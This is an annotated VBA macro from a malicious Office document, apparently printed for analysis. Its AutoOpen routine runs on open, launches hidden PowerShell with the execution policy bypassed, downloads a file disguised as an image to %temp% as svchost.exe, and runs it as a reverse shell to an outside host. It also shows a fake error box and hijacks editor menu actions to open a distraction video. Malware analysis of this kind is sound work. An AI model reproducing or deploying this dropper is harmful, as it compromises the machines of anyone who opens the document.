Sub badboy()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run ("https://www.youtube.com/watch?v=cQ_b4_lw0Gg") 'Likely a distraction
End Sub

Sub AutoOpen() 'Primary malicious subroutine
    pre = "cmd.exe /c powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden "
    exec1 = pre + "(New-Object System.Net.WebClient).DownloadFile('http://bartsimpson2.ignorelist.com/bart.jpg','%temp%\svchost.exe')"
    Shell (exec1) 'Downloads "bart.jpg" as "svchost.exe"
    exec2 = pre + "Start-Process -NoNewWindow -Wait -FilePath $env:TEMP\svchost.exe -ArgumentList 'bartsimpson2.ignorelist.com 45698 --exec cmd'"
    Shell (exec2) 'Executes the downloaded file with arguments
    
    MsgBox "Error opening file" 'Misleading error message
End Sub

Sub ViewVBCode()
     badboy 'Obfuscation
End Sub

Sub FileTemplates()
    badboy 'Obfuscation
End Sub
